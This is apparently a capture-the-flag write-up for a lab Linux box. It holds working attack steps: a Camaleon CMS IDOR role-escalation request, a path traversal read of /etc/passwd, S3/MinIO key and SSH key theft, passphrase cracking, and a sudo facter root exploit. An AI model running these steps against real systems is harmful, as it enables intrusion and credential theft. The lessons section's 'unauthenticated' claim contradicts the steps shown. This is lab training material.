# Facts

**OS:** Linux · **Difficulty:** Easy · **IP:** 10.129.5.38

---

## Summary

Privilege escalation via Camaleon CMS role manipulation exposes AWS S3 credentials pointing to a local MinIO instance. An internal bucket leaks an SSH private key. A path traversal vulnerability reveals valid system users. Key passphrase cracked via `john`. Root achieved through `facter`'s custom fact execution with `sudo`.

---

## Recon

### Port Scan

```
nmap -p- -Pn -T4 --min-rate 5000 10.129.5.38
nmap -p22,80,54321 -sCV 10.129.5.38
```

```
22/tcp    open  ssh    OpenSSH 9.9p1
80/tcp    open  http   nginx 1.26.3
54321/tcp open  s3     MinIO (local)
```

### Web: Port 80

Directory brute-force revealed an admin login panel:

```
gobuster dir -u http://facts.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

```
/admin/login
```

---

## Foothold

### Privilege Escalation via IDOR: Camaleon CMS 2.9.0

Registered a user, identified own account ID from session (`id=5`). Sent a crafted PATCH request to change the account role to `admin`:

```
POST /admin/users/5/updated_ajax
_method=patch&authenticity_token=<token>&password[password]=a&password[password_confirmation]=a&password[role]=admin
```

Response: `200 OK`: now authenticated as Administrator.

### AWS S3 Credentials: Filesystem Settings

Under **Settings → General Site → Filesystem Settings**:

```
Access Key : AKIAC62E19ABB212B5D1
Secret Key : RaBSzd/eLiPFmkkXpLcCg4sGbAZl3dz5mQWUaDQa
Bucket     : randomfacts
Region     : us-east-1
Endpoint   : http://localhost:54321
```

### S3 Enumeration: MinIO

Configured a local AWS profile and enumerated buckets against the internal MinIO endpoint:

```
aws configure --profile facts
aws --profile facts --endpoint-url http://10.129.5.38:54321 s3 ls s3:// --recursive
aws --profile facts --endpoint-url http://10.129.5.38:54321 s3 ls s3://internal --recursive
```

```
2026-03-11  .ssh/authorized_keys
2026-03-11  .ssh/id_ed25519
```

Downloaded both files:

```
aws --profile facts --endpoint-url http://10.129.5.38:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
aws --profile facts --endpoint-url http://10.129.5.38:54321 s3 cp s3://internal/.ssh/authorized_keys ./authorized_keys
```

### Path Traversal: User Enumeration

`authorized_keys` contained no username hint. Used a known Camaleon path traversal to read `/etc/passwd`:

```
curl -s -b "auth_token=<token>" "http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd" | grep -E '/bin/bash$|/bin/sh$'
```

```
root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

### SSH Key Passphrase

```
chmod 600 id_ed25519
python3 /usr/share/john/ssh2john.py id_ed25519 > id_ed25519.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.hash
```

```
dragonballz
```

### SSH

Of the three valid users, only `trivia` accepted the key:

```
ssh -i id_ed25519 -o StrictHostKeyChecking=no trivia@10.129.5.38
```

---

## Privilege Escalation

### Facter: Custom Fact Execution

```
sudo -l
```

```
(root) NOPASSWD: /usr/bin/facter
```

`facter` runs custom Ruby fact scripts via `--custom-dir`. Created a malicious fact:

```ruby
# exploit.rb
Facter.add(:exploit) do
  setcode do
    exec("/bin/bash")
  end
end
```

```
sudo /usr/bin/facter --custom-dir . exploit
```

```
uid=0(root) gid=0(root) groups=0(root)
```

---

## Flags

| | Hash |
|---|---|
| User | `cat /home/trivia/user.txt` |
| Root | `cat /root/root.txt` |

---

## Lessons Learned

- Camaleon CMS 2.9.0 IDOR allows role escalation to admin via a single unauthenticated PATCH: always check user-controlled ID parameters against privileged endpoints.
- MinIO local instances masquerading as S3 deserve the same enumeration treatment as real AWS: internal buckets often hold sensitive material left by developers.
- `facter --custom-dir` with `sudo` is an immediate root: any tool that loads and executes user-supplied scripts under elevated privileges is an escalation path.
